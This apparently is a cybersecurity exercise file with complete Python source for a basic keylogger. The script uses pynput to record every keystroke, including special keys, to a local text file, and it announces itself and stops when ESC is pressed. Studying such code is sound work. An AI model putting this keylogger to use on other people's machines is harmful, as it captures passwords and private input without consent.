# cybersecurity-4
create a basic keylogger program that records and logs keystroke focus on logging the keys pressed and saving them to a file

from pynput import keyboard

log_file_path = "keylog.txt"

def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            # Log the key pressed
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            # Log special keys
            log_file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

def main():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()

